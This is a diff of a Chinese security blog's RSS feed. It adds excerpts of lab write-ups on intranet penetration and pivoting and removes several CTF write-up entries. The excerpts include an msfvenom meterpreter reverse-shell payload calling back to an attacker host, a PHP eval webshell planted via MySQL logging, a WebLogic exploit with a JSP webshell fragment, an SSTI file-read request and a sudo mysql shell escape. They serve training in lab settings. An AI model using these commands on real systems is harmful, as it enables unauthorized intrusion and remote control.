@@ -23,6 +23,112 @@ sudo -l 列出目前用户可执行与无法执行的指令 (root) NOPASSWD: /us
 sudo mysql -e &#39;\! find / -name flag*&#39; 读flag]]></description>
 </item>
 <item>
+    <title>CFS三层靶机</title>
+    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</link>
+    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</guid>
+    <description><![CDATA[CFS三层靶机 0X01配置环境 分别打开三台靶机，输入账号密码进入
+rootteamssix.com 查看三台靶机的ip地址，
+确保Target1一个在192.168.1.0网段、另一个在192.168.22.0网段
+确保Target2在192.168.1.0、192.168.22.0、192.168.33.0网段
+确保Target3在192.168.33.0网段
+确保kali2022在192.168.1.0网段
+确认完毕后来到jkali，通过192.168.1.0网段的IP地址打开Tagrget1的宝塔面板
+地址：http://targ1的IP:8888/a768f109/账号：eaj3yhsl密码：41bb8fee 打开192.168.1.130的80端口，确保kali可以访问到
+Target2也同理，账号密码如下
+地址：http://你的IP:8888/2cc52ec0/账号：xdynr37d密码：123qwe.. 配置22网段 我这里是192.168.22.128
+然后删除Targ2的1网段网卡，因为1网段用途就是方便kali配Targ2的环境
+目前环境配置完成
+攻击机kali: 192.168.1.128Targ1 CentOS: 192.168.1.130 192.168.22.129Targ2 Ubuntu: 192.168.22.128 192.168.33.128 Targ3 Windows: 192.168.33.33 0X02信息收集getshell 主机探活
+扫描kali同网段的主机
+发现192.168.1.130，以及带出一些端口，这就是Targ1，我们对其进行渗透
+访问80端口找可利用点
+ThinkPHP5的框架，那就找框架的漏洞呗
+直接上工具梭
+上传马
+成功getshell
+0x03内网渗透 上线msf 生成linux木马
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.129 LPORT=4444 -f elf&gt;1.elf 上传到蚁剑
+msf监听
+msfdb runuse exploit/multi/handler set payload linux/x64/meterpreter/reverse_tcpset LHOST 192.168.1.128set LPORT 4444exploit 执行1.]]></description>
+</item>
+<item>
+    <title>三层靶机frp</title>
+    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/</link>
+    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/</guid>
+    <description><![CDATA[https://blog.csdn.net/qq_61237064/article/details/125602997参考此文搭建环境
+环境拓扑 kali : 192.168.1.133targ1: 192.168.1.135 192.168.22.134 (centos)targ2: 192.168.22.133 192.168.33.130 (ubuntu)targ3: 192.168.33.33 (win7) 靶机1渗透 信息收集 主机探活 + 端口扫描
+nmap 192.168.1.0/24 拿到targ1的ip，且开放了80端口
+外网打点 先访问靶机1的80端口
+tp5 直接工具梭
+顺利拿到shell
+蚁剑查看网络
+内网收集 得到22网段，既然发现了存在192.168.22.x/24 网段，所以尝试对 22 网段进行信息收集，这里使用fscan
+上传fscan 到targ1服务器目录/tmp （如果有杀软容易寄）
+./fscan -h 192.168.22.0/24 -o fscan.log 可以看到192.168.22.133是Target2，还是某个cms的站，80端口开发
+有两种方式进行利用：
+1.对 Target 2 80 端口进行端口转发。 2.使用反向代理，将Target 1 的网络通过vps代理出去。
+代理转发—重点 使用frp方式。
+frp存在服务端（frps）与客户端（frpc）， frps需要一直保持运行，转发方式通过客户端配置文件进行确定。
+一级代理
+配置服务端frps.ini
+[common] bind_addr = 0.0.0.0 # 在服务端上绑定的ip bind_port = 7000 # 在服务端上绑定的端口 启动服务端]]></description>
+</item>
+<item>
+    <title>红日靶场 1</title>
+    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</link>
+    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</guid>
+    <description><![CDATA[红日靶场 1 01环境配置 在 VMware 中选择虚拟网络编辑器设置内网网段192.168.52.0/24，NAT 和DHCP都要设置
+win7上要多添加一个桥接网卡可以分配一个真实ip
+三台靶机的默认开机密码都为hongrisec@2019
+win7就用默认密码了 ，其他两个需要修改密码，我修改成hongrisec@2022
+win7提示重启，重启后打开phpstudy
+ipconfig查看
+可以看到分配的真实ip
+访问ip得到phpstudy探针，本机也可以
+同时我们需要保持外网、域网络防火墙为未开启状态
+02信息收集 探测内网存活 netdiscover -i eth0 -r 192.168.52.0/24 nmap扫描端口 nmap -Pn -sV -p- -A 192.168.52.143 --min-rate=1000 扫端口，可以利于80,3306
+80端口也就是刚才的phpstudy探针，可以看看有无利于点
+最下面有个mysql数据库连接检测的功能，root/root 最简单的弱口令 发现检测成功
+那去找一下mysql的后台登录页面，
+dirsearch扫描目录 可以看到不少phpmyadmin，找到后台 弱口令就登录进来了
+查看日志权限 show variables like &#39;general%&#39; set global general_log= &#34;ON&#34;; 打开权限set global general_log_file=&#34;C:/phpStudy/WWW/123.php&#34;; 设置查看日志的文件，文件路径可以在探针看 03Getshell 利用日志文件getshell sql语句执行 select &quot;&lt;?php phpinfo();?&gt;&quot; ;
+访问刚才定义的日志页面 ，可以getshell
+传入shell ,连接蚁剑
+select &#34;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&#34; ; Yxcms后台登录getshell mysql后台看到有个newyxcms的数据库]]></description>
+</item>
+<item>
+    <title>红日靶场2</title>
+    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</link>
+    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</guid>
+    <description><![CDATA[红日靶场2 拓扑图 默认密码：1qaz@WSX
+0x01环境搭建 我是参考此视频
+https://www.bilibili.com/video/BV1De4y1a7Ps/?spm_id_from=333.337.search-card.all.click&vd_source=cf73ac8de9b7c0322b1bccf77de91c5dnat模式分配111段
+自定义一个10.10.10.x 的网络 我命名为VMnet5
+进入WEB中，来到C:\Oracle\Middleware\user_projects\domains\base_domain\bin 路径 以管理员权限执行startWebLogic
+0x02信息收集 端口扫描 这个命令显示更详细，可以看到不少的服务都打开了
+漏洞探测 80端口是空白，这边先重点关注一下7001 Oracle WebLogic Server
+跳转到404
+尝试使用WeblogicScan脚本探测漏洞：
+python3 WeblogicScan.py -u 192.168.111.80 -p 7001 有合适的cve
+github准备好exp工具进行利用
+-u 检测 -f上传木马
+得到一个url 可以直接执行命令
+上帝视角去看靶机的shell.jsp的文件位置
+C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war
+传入马比较棘手且比赛也没有上帝视角，另寻其他方法
+getShell 找到个工具weblogic漏洞检测工具
+输入url就能扫漏洞，然后命令执行，最好用的是可以文件上传，这里传入一个蚁剑的jsp马
+&lt;%!class U extends ClassLoader {U(ClassLoader c) {super(c);}public Class g(byte[] b) {return super.defineClass(b, 0, b.length);}}public byte[] base64Decode(String str) throws Exception {try {Class clazz = Class.]]></description>
+</item>
+<item>
     <title>0xgame2022</title>
     <link>https://thnpkm.github.io/posts/ctf/0xgame2022/</link>
     <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
@@ -99,70 +205,6 @@ name=1&#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ name=1&#3
 &lt;?php highlight_file(__FILE__); error_reporting(0); include(&#34;seed.php&#34;); //mt_srand(*********); echo &#34;Hint: &#34;.mt_rand().&#34;&lt;br&gt;&#34;; if(isset($_POST[&#39;guess&#39;]) &amp;&amp; md5($_POST[&#39;guess&#39;]) === md5(mt_rand())){ if(!preg_match(&#34;/base|\.\./i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; preg_match(&#34;/NewStar/i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; isset($_GET[&#39;file&#39;])){ //flag in `flag.php` include($_GET[&#39;file&#39;]); }else{ echo &#34;Baby Hacker?&#34;; } }else{ echo &#34;No Hacker!&#34;; } Hint: 1219893521 给了mt_rand，用提示给的网站工具，进行爆破
 拿到正确的种子
 &lt;?php mt_srand(1145146); mt_rand(); echo mt_rand(); ?]]></description>
-</item>
-<item>
-    <title>CatCTF</title>
-    <link>https://thnpkm.github.io/posts/ctf/catctf/</link>
-    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
-    <author>Author</author>
-    <guid>https://thnpkm.github.io/posts/ctf/catctf/</guid>
-    <description><![CDATA[MISC Cat_Jump 尝试了去打开玩游戏但是没搞定，直接strings了 非预期
-strings xxx | grep CatCTF{
-Peekaboo MeowMeow CatCTF{CAT_GOES_MEOW} ,010打开看ascii的形状，ctfshow有一道这样的题
-miao~ strings 了一下，出现这一堆
-网上有些题是 直接看属性有东西，exiftool没发现啥
-foremost 出 wav ，频谱图
-CatCTF 某个密码
-试试jpg隐写的工具，都没试出来，卡这里了，wav我也去尝试了silenteye没结果
-正确是DeepSound工具解密，之前没用过 ,选择wav输入密码，得到个flag.txt
-在他默认保存路径可以打开flag.txt
-然后兽语解密
-CatCat 这个文件名一看就猜测是 rabbit加密 和base91
-rabbit的密钥，jpg用010打开搜索pass
-密钥是catflag
-然后base91
-这一看就是Ook解密，将cat替换成Ook
-CatchCat 可爱的猫猫走丢了，还好猫猫有GPS定位装置，我们陆陆续续在终端收到了GPS数据，你能帮忙找到可爱的猫猫吗？
-给了一堆GPGGA的数据，找了很久没有找到合适的网站
-想着提取出经纬度
-f= open(&#39;1.txt&#39;) lines = f.readlines() for line in lines: print(line[17:30]+&#39;,&#39;+line[33:47]) 刚开始用gnuplot画个图，但是画出来看不出啥，想着去用谷歌地球画路线，不过需要KML文件
-&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; &lt;kml xmlns=&#34;http://www.opengis.net/kml/2.2&#34;&gt; &lt;Document&gt; &lt;name&gt;KML&lt;/name&gt; &lt;description&gt;KML&lt;/description&gt; &lt;Placemark&gt; &lt;name&gt;[2011/2/1 19:59:14]&lt;/name&gt; &lt;description&gt;line&lt;/description&gt; &lt;LineString&gt; &lt;coordinates&gt; 3416.48590278,10856.86623887 3416.48590278,10856.86623887 .......................... &lt;/coordinates&gt; &lt;/LineString&gt; &lt;/Placemark&gt; &lt;/Document&gt; &lt;/kml&gt; 将经纬度替换后，导入谷歌地球]]></description>
-</item>
-<item>
-    <title>ciscn2023初赛</title>
-    <link>https://thnpkm.github.io/posts/ctf/ciscn2023%E5%88%9D%E8%B5%9B/</link>
-    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
-    <author>Author</author>
-    <guid>https://thnpkm.github.io/posts/ctf/ciscn2023%E5%88%9D%E8%B5%9B/</guid>
-    <description><![CDATA[go_session GET /admin?name={%25%20include%20c.Request.Header.Accept.0%20%25} HTTP/1.1Host: 123.56.99.60:12488Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36Accept: /etc/passwdAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: session-name=MTY4NTE2NjEzNnxFXy1CQkFFQkEwOWlhZ0hfZ2dBQkVBRVFBQUFqXzRJQUFRWnpkSEpwYm1jTUJnQUVibUZ0WlFaemRISnBibWNNQndBRllXUnRhVzQ9fEDXM_0GyRu_LshoipBIWA6dvJ8u4d-oTgM7OGlKvC2SConnection: close 实现任意文件读取
-还是]]></description>
-</item>
-<item>
-    <title>D^3ctf 2023</title>
-    <link>https://thnpkm.github.io/posts/ctf/d3ctf-2023/</link>
-    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
-    <author>Author</author>
-    <guid>https://thnpkm.github.io/posts/ctf/d3ctf-2023/</guid>
-    <description><![CDATA[web EscapePlan 源码是ban了很多字符和关键字
-black_char = [ &#34;&#39;&#34;, &#39;&#34;&#39;, &#39;.&#39;, &#39;,&#39;, &#39; &#39;, &#39;+&#39;, &#39;__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;str&#39;, &#39;import&#39;, &#39;except&#39;, &#39;if&#39;, &#39;for&#39;, &#39;while&#39;, &#39;pass&#39;, &#39;with&#39;, &#39;assert&#39;, &#39;break&#39;, &#39;class&#39;, &#39;raise&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, ] for char in black_char: if char in cmd: return f&#39;failed: `{char}`&#39; msg = &#34;success&#34; try: eval(cmd) except Exception: msg = &#34;error&#34; 关于python的一些trick，记录一下,可以通过len() int()函数等拿到数字
-例如：
-int(len(black_char)) == 31 int(char) == 9 int(black_char[len(black_char)-int(char)]) == 1 可以利用black_char下标拿到任何黑名单 len([]) == 0 len(black_char[len([])]) ==1 int(False)==0 ~int(False)==-1 -~int(False)==1 &lt;&lt; 是一个位移运算符，用于将一个操作数的二进制表示向左移动指定的位数 &lt;&lt; 1 相当于 乘以2的1次方 | 是一个按位或运算符 5|6 == 7 亚军的exp，用的repr(request) 自己这里打不通]]></description>
-</item>
-<item>
-    <title>DAS x SU</title>
-    <link>https://thnpkm.github.io/posts/ctf/das-x-su/</link>
-    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
-    <author>Author</author>
-    <guid>https://thnpkm.github.io/posts/ctf/das-x-su/</guid>
-    <description><![CDATA[WEB pdf_converter 大家都非预期了
-发现是ThinkPHP5 的框架
-直接可以随便用公开的payload直接打
-pdf_converter_revenge 这个找cve是找错了，然后访问pdf函数这里还是有迷惑，
-现在知道了是index.php/index/index/pdf 当时一直是尝试index.php/index/pdf
-正确思路是CVE-2022-41343 - 通过 Phar 反序列化的 RCE
-https://buaq.net/go-129526.html跟着文章复现
-直接跑这个脚本，但是有个font库需要安装sudo apt-get install python3-fontforge
-#!/usr/bin/env python3 import fontforge import os import sys import tempfile from typing import Optional def main(): sys.stdout.buffer.write(do_generate_font()) def do_generate_font() -&gt; bytes: fd, fn = tempfile.mkstemp(suffix=&#34;.ttf&#34;) os.close(fd) font = fontforge.font() font.copyright = &#34;DUMMY FONT&#34; font.generate(fn) with open(fn, &#34;rb&#34;) as f: res = f.read() os.unlink(fn) result = res return result if __name__ == &#34;__main__&#34;: main() 获取一个font.]]></description>
 </item>
 </channel>
 </rss>
